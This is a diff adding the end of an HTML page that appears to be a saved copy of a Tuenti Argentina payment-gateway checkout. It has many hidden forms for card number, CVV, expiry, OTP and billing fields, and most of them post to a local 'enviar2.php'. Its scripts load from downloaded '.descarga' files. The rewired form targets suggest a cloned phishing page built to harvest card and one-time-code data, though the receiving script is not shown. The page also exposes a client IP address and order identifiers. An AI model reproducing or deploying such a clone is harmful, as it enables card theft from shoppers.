+        <input type="hidden" id="ccnumber" name="ccnumber" value="">
+        <input type="hidden" id="cvv" name="cvv" value="">
+        <input type="hidden" id="ccexp" name="ccexp" value="">
+        <input type="hidden" name="HOSTNAME" value="2_443">
+        <input type="hidden" name="TIPORECURRENCIA" value="">
+    </form>
+
+
+    <form name="Form3DGlobalPayment" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" id="PaReq" name="PaReq" value="">
+        <input type="hidden" id="TermUrl" name="TermUrl" value="">
+        <input type="hidden" id="MD" name="MD" value="">
+        <input type="hidden" name="HOSTNAME" value="2_443">
+        <input type="hidden" name="TIPORECURRENCIA" value="">
+    </form>
+
+    <form name="Form3DAdyen" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" id="RESULTCODE" name="RESULTCODE" value="">
+        <input type="hidden" id="URL3DADYEN" name="URL3DADYEN" value="">
+        <input type="hidden" id="URL3DADYENOK" name="URL3DADYENOK" value="">
+        <input type="hidden" id="SERVERTRANSID" name="SERVERTRANSID" value="">
+        <input type="hidden" id="CASE" name="CASE" value="">
+        <input type="hidden" name="HOSTNAME" value="2_443">
+        <input type="hidden" name="FINGERPRINT" value="">
+        <input type="hidden" name="PAN" value="">
+        <input type="hidden" name="FECCAD" value="">
+        <input type="hidden" name="IMPTRANS" value="">
+        <input type="hidden" name="IDENTIDAD" value="TUAR">
+        <input type="hidden" name="IDCOMERCIO" value="02000010303">
+        <input type="hidden" name="IDPEDIDO" value="2022031647825276559">
+
+        <input type="hidden" name="ACSTRANSID" value="">
+        <input type="hidden" name="MESSAGEVERSION" value="">
+        <input type="hidden" name="IDVERSION" value="0005">
+        <input type="hidden" name="TIPORECURRENCIA" value="">
+    </form>
+
+    <form name="FormRespInfoPan" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" name="IDTM" value="">
+        <input type="hidden" name="CODRESOLUCION" value="">
+        <input type="hidden" name="DESRESOLUCION" value="">
+        <input type="hidden" name="BIN" value="">
+        <input type="hidden" name="EMISOR" value="">
+        <input type="hidden" name="PAISEMISOR" value="">
+        <input type="hidden" name="MARCA" value="">
+        <input type="hidden" name="NUMSIA" value="">
+        <input type="hidden" name="IDVERSION" value="">
+        <input type="hidden" name="DISPOSICION" value="">
+        <input type="hidden" name="SUBTIPO" value="">
+        <input type="hidden" name="IMPTRANS" value="">
+        <input type="hidden" name="IDIOMA" value="">
+        <input type="hidden" name="IDIOMA_ENTIDAD" value="ES">
+        <input type="hidden" name="IDPEDIDO" value="2022031647825276559">
+
+        <input type="hidden" name="MERCHANT_OTP" value="">
+        <input type="hidden" name="AUTHORIZATION_TOKEN" value="">
+        <input type="hidden" name="CVV_OPCIONAL" value="">
+    </form>
+
+    <form name="FormRespCuotas" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" name="CODRESOLUCION" value="">
+        <input type="hidden" id="COMBOCUOTA" name="COMBOCUOTA" value="">
+        <input type="hidden" id="COMBOCUOTA2" name="COMBOCUOTA2" value="">
+        <input type="hidden" name="DESRESOLUCION" value="">
+    </form>
+
+
+
+    <form name="FormApplePay" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" name="URL" value="">
+        <input type="hidden" name="MERCHANT_ID" value="">
+        <input type="hidden" name="DISPLAY_NAME" value="">
+        <input type="hidden" name="DOMINIO" value="">
+        <input type="hidden" name="TOKENAPPLE" value="">
+        <input type="hidden" name="VALIDATEJSON" value="">
+        <input type="hidden" name="PAN" value="">
+        <input type="hidden" name="IDVERSION" value="0005">
+        <input type="hidden" name="IDCOMERCIO" value="02000010303">
+        <input type="hidden" name="IDPEDIDO" value="2022031647825276559">
+
+        <input type="hidden" name="PAYMENT_CERTIFICATE" value="">
+        <input type="hidden" name="IDENTIDAD" value="TUAR">
+        <input type="hidden" name="IDTM" value="1200">
+        <input type="hidden" name="OPCTOKEN" value="">
+        <input type="hidden" name="FECCAD" value="">
+        <input type="hidden" name="IMPTRANS" value="80000">
+        <input type="hidden" name="IDIOMA" value="ES">
+        <input type="hidden" name="IPORIGEN" value="181.46.164.136">
+        <input type="hidden" name="TOKEN" value="">
+        <input type="hidden" name="FECHSIA" value="">
+        <input type="hidden" name="FECHPRO" value="">
+        <input type="hidden" name="FFHHTRANS" value="">
+        <input type="hidden" name="NUMSIA" value="">
+        <input type="hidden" name="NUMAUT" value="">
+        <input type="hidden" name="URLOK" value="https://www.tuenti.com.ar/web/tuenti/payment-gateway-recharge-iframe">
+        <input type="hidden" name="URLKO" value="https://www.tuenti.com.ar/web/tuenti/payment-gateway-recharge-iframe">
+        <input type="hidden" name="IMPTRANSDCC" value="">
+        <input type="hidden" name="CODMONDCC" value="">
+        <input type="hidden" name="PAGO_REC" value="0">
+        <input type="hidden" name="USO_CAPTCHA" value="0">
+        <input type="hidden" name="PAGO_CUOTA" value="N">
+        <input type="hidden" name="TIPO_TARJETA" value="N">
+        <input type="hidden" name="CIUDAD" value="">
+        <input type="hidden" name="CALLE" value="">
+        <input type="hidden" name="TIPOTARJETA" value="">
+        <input type="hidden" name="VAL_TITULAR" value="S">
+        <input type="hidden" name="PAYPAL" value="0">
+        <input type="hidden" name="APPLEPAY" value="0">
+        <input type="hidden" name="TIPOPAGO" value="">
+        <input type="hidden" name="NUMEROCUOTAS" value="">
+        <input type="hidden" name="MESESGRACIA" value="">
+        <input type="hidden" name="IMPTRANSCUOTAS" value="">
+        <input type="hidden" name="CONFIANZA" value="">
+        <input type="hidden" name="SCORE" value="">
+        <input type="hidden" name="TRESDSECUREOBL" value="">
+        <input type="hidden" name="CANAL" value="01">
+        <input type="hidden" name="TIPO_DCC" value="">
+        <input type="hidden" name="CAPTCHATRASINFORIESGO" value="0">
+        <input type="hidden" name="CODPOSTAL" value="">
+        <input type="hidden" name="ESTADO" value="">
+        <input type="hidden" name="DEVICEFINGERPRINTID" value="">
+        <input type="hidden" name="PERSONALID" value="">
+        <input type="hidden" name="DIRECCIONBANCO" value="">
+        <input type="hidden" name="CODIGOBANCO" value="">
+        <input type="hidden" name="CODSUCURSALBANCO" value="">
+        <input type="hidden" name="CIUDADBANCO" value="">
+        <input type="hidden" name="PAISBANCO" value="">
+        <input type="hidden" name="NOMBREBANCO" value="">
+        <input type="hidden" name="SWIFTCODEBANCO" value="">
+        <input type="hidden" name="PERFILADMINISTRADOR" value="">
+        <input type="hidden" name="NOMBRECTATRANSFER" value="">
+        <input type="hidden" name="NUMEROCTATRANSFER" value="">
+        <input type="hidden" name="DIGITOCONTROLTRANSFER" value="">
+        <input type="hidden" name="IBANTRANSFER" value="">
+        <input type="hidden" name="CIUDADENVIO" value="">
+        <input type="hidden" name="PAISENVIO" value="">
+        <input type="hidden" name="NOMBREENVIO" value="">
+        <input type="hidden" name="APELLIDOSENVIO" value="">
+        <input type="hidden" name="TELEFONOENVIO" value="">
+        <input type="hidden" name="CODPOSTALENVIO" value="">
+        <input type="hidden" name="METODOENVIO" value="">
+        <input type="hidden" name="ESTADOENVIO" value="">
+        <input type="hidden" name="DIRECCION1ENVIO" value="">
+        <input type="hidden" name="DIRECCION2ENVIO" value="">
+        <input type="hidden" name="TELEFONOORIGEN" value="">
+        <input type="hidden" name="SERVICIO" value="">
+        <input type="hidden" name="TELEFONORECARGA" value="">
+        <input type="hidden" name="NUMEROEQUIPOS" value="">
+        <input type="hidden" name="CATEGORIAEQUIPO" value="">
+        <input type="hidden" name="MARCAPRODUCTO" value="">
+        <input type="hidden" name="MODELOPRODUCTO" value="">
+        <input type="hidden" name="CLIENTEFRECUENTE" value="">
+        <input type="hidden" name="PERSONAFISICA" value="">
+        <input type="hidden" name="TIEMPOCLIENTE" value="">
+        <input type="hidden" name="COMPRASEXITOSAS" value="">
+        <input type="hidden" name="DIASULTIMACOMPRA" value="">
+        <input type="hidden" name="OPECLIENTE" value="">
+        <input type="hidden" name="DESTOKENCOMERCIO" value="">
+        <input type="hidden" name="IMPORTECONIVA" value="80000">
+        <input type="hidden" name="IMPORTESINIVA" value="">
+        <input type="hidden" name="IMPORTEADICIONAL" value="000">
+        <input type="hidden" name="IMPORTEPROPINA" value="">
+        <input type="hidden" name="IMPORTEINTERESES" value="">
+        <input type="hidden" name="IMPORTEFIJO" value="">
+        <input type="hidden" name="IMPORTESERVICIO" value="">
+        <input type="hidden" name="CAPTCHATDES" value="">
+        <input type="hidden" name="BROWSERSESION" value="">
+        <input type="hidden" name="CALLE2" value="">
+        <input type="hidden" name="NUMEROCALLE" value="">
+        <input type="hidden" name="DISTRITO" value="">
+        <input type="hidden" name="TIPOTELEFONO" value="">
+        <input type="hidden" name="PREFIJOPAIS" value="">
+        <input type="hidden" name="PREFIJOTELEFONO" value="">
+        <input type="hidden" name="NUMERODIRECCIONENVIO" value="">
+        <input type="hidden" name="DISTRITOENVIO" value="">
+        <input type="hidden" name="TIPOTELEFONOENVIO" value="">
+        <input type="hidden" name="PREFIJOPAISENVIO" value="">
+        <input type="hidden" name="PREFIJOTELEFONOENVIO" value="">
+        <input type="hidden" name="AREARECARGA" value="">
+        <input type="hidden" name="IDTIENDA" value="">
+        <input type="hidden" name="TIPOTIENDA" value="">
+        <input type="hidden" name="IDVENDEDOR" value="">
+        <input type="hidden" name="IDLEGALVENDEDOR" value="">
+        <input type="hidden" name="ADMISIONVENDEDOR" value="">
+        <input type="hidden" name="NACIMIENTOVENDEDOR" value="">
+        <input type="hidden" name="ACUMULADOR1" value="">
+        <input type="hidden" name="ACUMULADOR2" value="">
+        <input type="hidden" name="MSISDN" value="">
+        <input type="hidden" name="ECI" value="">
+        <input type="hidden" name="CRYPTOGRAM" value="">
+        <input type="hidden" name="NOMTITULAR" value="">
+        <input type="hidden" name="HOSTNAME" value="2_443">
+        <input type="hidden" name="TIPORECURRENCIA" value="">
+        <input type="hidden" name="VERSIONRSA" value="0001LIVE">
+        <input type="hidden" name="ECBILLINGFIRSTNAME" value="">
+        <input type="hidden" name="ECBILLINGLASTNAME" value="">
+        <input type="hidden" name="ECBILLINGPAIS" value="">
+        <input type="hidden" name="ECBILLINGESTADO" value="">
+        <input type="hidden" name="ECBILLINGNUMEROTELEFONO" value="">
+        <input type="hidden" name="ECBILLINGEMAILUSUARIO" value="">
+        <input type="hidden" name="ECSHIPPINGEMAILUSUARIOENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGNOMBREENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGAPELLIDOSENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGPAISENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGESTADOENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGTELEFONOENVIO" value="">
+        <input type="hidden" name="ECBILLINGCALLE" value="">
+        <input type="hidden" name="ECBILLINGCALLE2" value="">
+        <input type="hidden" name="ECBILLINGCODPOSTAL" value="">
+        <input type="hidden" name="ECBILLINGCIUDAD" value="">
+        <input type="hidden" name="ECSHIPPINGDIRECCION1ENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGDIRECCION2ENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGCODPOSTALENVIO" value="">
+        <input type="hidden" name="ECSHIPPINGCIUDADENVIO" value="">
+        <input type="hidden" name="PAYMENTDATA" value="">
+        <input type="hidden" name="COD_PAIS_APPLE" value="">
+        <input type="hidden" name="CARDNETWORK" value="">
+    </form>
+
+    <form name="FormCybersource" method="post">
+        <input type="hidden" id="JWTContainer" value="">
+        <!--OJO NO QUITAR EL JWTContainer -->
+        <input type="hidden" data-cardinal-field="AccountNumber" id="creditCardNumber" name="creditCardNumber">
+        <input type="hidden" name="PaReq" value="">
+        <input type="hidden" name="TermUrl" value="">
+        <input type="hidden" name="CASE" value="">
+        <input type="hidden" name="Payload" value="">
+        <input type="hidden" name="TransactionId" value="">
+        <input type="hidden" id="OrderChannel" name="OrderChannel" value="">
+
+        <input type="hidden" id="JWTValidate" name="JWTValidate" value="">
+        <input type="hidden" name="ORIGENOPERACION" value="PAYMENT">
+        <input type="hidden" name="PAN" value="">
+        <input type="hidden" name="CVC" value="">
+        <input type="hidden" name="IMPTRANS" value="">
+        <input type="hidden" name="EXPIRYDATEMONTH" value="">
+        <input type="hidden" name="EXPIRYDATEYEAR" value="">
+        <input type="hidden" name="CODRESOLUCION" value="">
+        <input type="hidden" name="DESRESOLUCION" value="">
+        <input type="hidden" name="IDTM" value="1200">
+        <input type="hidden" name="CIUDAD" value="">
+        <input type="hidden" name="CALLE" value="">
+        <input type="hidden" name="SCORE" value="">
+        <input type="hidden" name="CONFIANZA" value="">
+        <input type="hidden" name="TIPOTARJETA" value="">
+        <input type="hidden" name="TIPOPAGO" value="">
+        <input type="hidden" name="NUMEROCUOTAS" value="">
+        <input type="hidden" name="MESESGRACIA" value="">
+        <input type="hidden" name="IMPTRANSCUOTAS" value="">
+        <input type="hidden" name="CODPOSTAL" value="">
+        <input type="hidden" name="ESTADO" value="">
+        <input type="hidden" name="DEVICEFINGERPRINTID" value="">
+        <input type="hidden" name="DIRECCIONBANCO" value="">
+        <input type="hidden" name="CODIGOBANCO" value="">
+        <input type="hidden" name="CODSUCURSALBANCO" value="">
+        <input type="hidden" name="CIUDADBANCO" value="">
+        <input type="hidden" name="PAISBANCO" value="">
+        <input type="hidden" name="NOMBREBANCO" value="">
+        <input type="hidden" name="SWIFTCODEBANCO" value="">
+        <input type="hidden" name="PERFILADMINISTRADOR" value="">
+        <input type="hidden" name="NOMBRECTATRANSFER" value="">
+        <input type="hidden" name="NUMEROCTATRANSFER" value="">
+        <input type="hidden" name="DIGITOCONTROLTRANSFER" value="">
+        <input type="hidden" name="IBANTRANSFER" value="">
+        <input type="hidden" name="CIUDADENVIO" value="">
+        <input type="hidden" name="PAISENVIO" value="">
+        <input type="hidden" name="NOMBREENVIO" value="">
+        <input type="hidden" name="APELLIDOSENVIO" value="">
+        <input type="hidden" name="TELEFONOENVIO" value="">
+        <input type="hidden" name="CODPOSTALENVIO" value="">
+        <input type="hidden" name="METODOENVIO" value="">
+        <input type="hidden" name="ESTADOENVIO" value="">
+        <input type="hidden" name="DIRECCION1ENVIO" value="">
+        <input type="hidden" name="DIRECCION2ENVIO" value="">
+        <input type="hidden" name="PERSONALID" value="">
+        <input type="hidden" name="IMPORTECONIVA" value="80000">
+        <input type="hidden" name="IMPORTESINIVA" value="">
+        <input type="hidden" name="IMPORTEADICIONAL" value="000">
+        <input type="hidden" name="IMPORTEPROPINA" value="">
+        <input type="hidden" name="IMPORTEINTERESES" value="">
+        <input type="hidden" name="IMPORTEFIJO" value="">
+        <input type="hidden" name="IMPORTESERVICIO" value="">
+        <input type="hidden" name="TELEFONOORIGEN" value="">
+        <input type="hidden" name="SERVICIO" value="">
+        <input type="hidden" name="TELEFONORECARGA" value="">
+        <input type="hidden" name="NUMEROEQUIPOS" value="">
+        <input type="hidden" name="CATEGORIAEQUIPO" value="">
+        <input type="hidden" name="MARCAPRODUCTO" value="">
+        <input type="hidden" name="MODELOPRODUCTO" value="">
+        <input type="hidden" name="CLIENTEFRECUENTE" value="">
+        <input type="hidden" name="PERSONAFISICA" value="">
+        <input type="hidden" name="TIEMPOCLIENTE" value="">
+        <input type="hidden" name="COMPRASEXITOSAS" value="">
+        <input type="hidden" name="DIASULTIMACOMPRA" value="">
+        <input type="hidden" name="BROWSERSESION" value="">
+        <input type="hidden" name="CALLE2" value="">
+        <input type="hidden" name="NUMEROCALLE" value="">
+        <input type="hidden" name="DISTRITO" value="">
+        <input type="hidden" name="TIPOTELEFONO" value="">
+        <input type="hidden" name="PREFIJOPAIS" value="">
+        <input type="hidden" name="PREFIJOTELEFONO" value="">
+        <input type="hidden" name="NUMERODIRECCIONENVIO" value="">
+        <input type="hidden" name="DISTRITOENVIO" value="">
+        <input type="hidden" name="TIPOTELEFONOENVIO" value="">
+        <input type="hidden" name="PREFIJOPAISENVIO" value="">
+        <input type="hidden" name="PREFIJOTELEFONOENVIO" value="">
+        <input type="hidden" name="AREARECARGA" value="">
+        <input type="hidden" name="IDTIENDA" value="">
+        <input type="hidden" name="TIPOTIENDA" value="">
+        <input type="hidden" name="IDVENDEDOR" value="">
+        <input type="hidden" name="IDLEGALVENDEDOR" value="">
+        <input type="hidden" name="ADMISIONVENDEDOR" value="">
+        <input type="hidden" name="NACIMIENTOVENDEDOR" value="">
+        <input type="hidden" name="ACUMULADOR1" value="">
+        <input type="hidden" name="ACUMULADOR2" value="">
+        <input type="hidden" name="MSISDN" value="">
+        <input type="hidden" name="HOSTNAME" value="2_443">
+        <input type="hidden" name="TIPORECURRENCIA" value="">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+    </form>
+
+    <form name="FormDinnersOTP" method="post">
+        <input type="hidden" name="CODRESOLUCION" value="">
+        <input type="hidden" name="DESRESOLUCION" value="">
+        <input type="hidden" name="APPLICATION_ID" value="">
+        <input type="hidden" name="CANAL_ID" value="">
+        <input type="hidden" name="IP" value="">
+        <input type="hidden" name="FFHHTRANS" value="">
+        <input type="hidden" name="NIVEL_TRACE" value="">
+        <input type="hidden" name="NOMBRE_SERVICIO" value="">
+        <input type="hidden" name="PORTAL" value="">
+        <input type="hidden" name="PERFIL" value="">
+        <input type="hidden" name="USUARIO_BIOMETRICO" value="">
+        <input type="hidden" name="TRANSACCION" value="">
+        <input type="hidden" name="PAN" value="">
+        <input type="hidden" name="TIPO_TARJETA" value="">
+        <input type="hidden" name="OTP" value="">
+        <input type="hidden" name="MERCHANT_OTP" value="">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+
+    </form>
+
+    <form name="Form3DSEC" method="get"></form>
+
+    <form name="FormAUX" method="post">
+        <!-- INI OTP -->
+        <input type="hidden" name="OTP" value="">
+        <input type="hidden" name="TIPO_TARJETA" value="">
+        <input type="hidden" name="MERCHANT_OTP" value="">
+        <input type="hidden" name="APPLICATION_ID" value="">
+        <input type="hidden" name="FFHHTRANS" value="">
+        <input type="hidden" name="CANAL_ID" value="IN">
+        <input type="hidden" name="NIVEL_TRACE" value="INFO">
+        <input type="hidden" name="IP" value="181.46.164.136">
+        <input type="hidden" name="NOMBRE_SERVICIO" value="IntegracionWSBotonPagoOTP">
+        <input type="hidden" name="PORTAL" value="PIN">
+        <input type="hidden" name="PERFIL" value="S">
+        <input type="hidden" name="TRANSACCION" value="TLF">
+        <input type="hidden" name="USUARIO_BIOMETRICO" value="">
+        <!--<INPUT type='hidden' name='LLAVE_SIMETRICA' value=''>		 
+	 <INPUT type='hidden' name='UUID' value=''>
+	 <INPUT type='hidden' name='PAN_TKN' value=''> 	 
+ 	 <INPUT type='hidden' name='LLAVECIFRADA' value=''>-->
+        <input type="hidden" name="contVerificacionOTP" value="">
+        <!-- FIN OTP -->
+
+        <!-- INI 3DADYEN -->
+        <input type="hidden" id="RESULTCODE" name="RESULTCODE" value="">
+        <input type="hidden" id="URL3DADYEN" name="URL3DADYEN" value="">
+        <input type="hidden" id="URL3DADYENOK" name="URL3DADYENOK" value="">
+        <input type="hidden" id="SERVERTRANSID" name="SERVERTRANSID" value="">
+        <input type="hidden" name="ACSTRANSID" value="">
+        <input type="hidden" name="MESSAGEVERSION" value="">
+        <!-- INI 3DADYEN -->
+        <input type="hidden" id="CASE" name="CASE" value="">
+        <!-- INI CYBERSOURCE -->
+        <input type="hidden" id="JWTContainer" value="">
+        <!--OJO NO QUITAR EL JWTContainer -->
+        <input type="hidden" id="JWTValidate" name="JWTValidate" value="">
+        <input type="hidden" data-cardinal-field="AccountNumber" id="creditCardNumber" name="creditCardNumber">
+        <input type="hidden" name="PaReq" value="">
+        <input type="hidden" name="TermUrl" value="">
+        <input type="hidden" name="Payload" value="">
+        <input type="hidden" name="TransactionId" value="">
+        <input type="hidden" id="OrderChannel" name="OrderChannel" value="">
+        <!-- INI PAYPAL -->
+        <input type="hidden" name="INITPAYPAL" value="">
+
+        <input type="hidden" name="RESULTTRANS" value="">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+    </form>
+
+    <form name="FormEstadoOper" method="post" action="enviar2.php">
+        <input type="hidden" name="ESTADO_OPER" value="">
+    </form>
+
+    <form name="FormTIEMPOTRANSACCION" method="post" action="enviar2.php">
+        <input type="hidden" name="TIEMPOTRANSACCION" value="">
+    </form>
+
+    <!-- INCLUSI�N TRES3SECURE 7.5-->
+
+
+    <script src="./fpSIA.js.descarga"></script>
+    <script>
+        var fingerprintReport = function() {
+            var d1 = new Date()
+            FpSIA.get(function(components) {
+                var d2 = new Date()
+                var timefp = d2 - d1
+                document.getElementById("timefp").value = timefp
+                var details = ""
+
+                for (var index in components) {
+                    var obj = components[index]
+                    var line = obj.key + " = " + String(obj.value).substr(0, 100)
+                    details += line + "\n"
+                }
+                document.getElementById("details").value = details;
+            })
+        }
+
+        fingerprintReport();
+    </script>
+
+
+
+
+
+
+
+
+    <script>
+        document.all.bTITULAR.value = "false";
+    </script>
+
+
+
+
+
+    <script>
+        if (pasoNewCard == true) {
+            document.write('<scr' + 'ipt  src="/includes/sh_NCARD.js?v=310122"></scr' + 'ipt>');
+        } else {
+            document.write('<scr' + 'ipt  src="/includes/sh_NCARD_V2.js?v=310122"></scr' + 'ipt>');
+        }
+    </script>
+    <script src="./sh_NCARD_V2.js.descarga"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
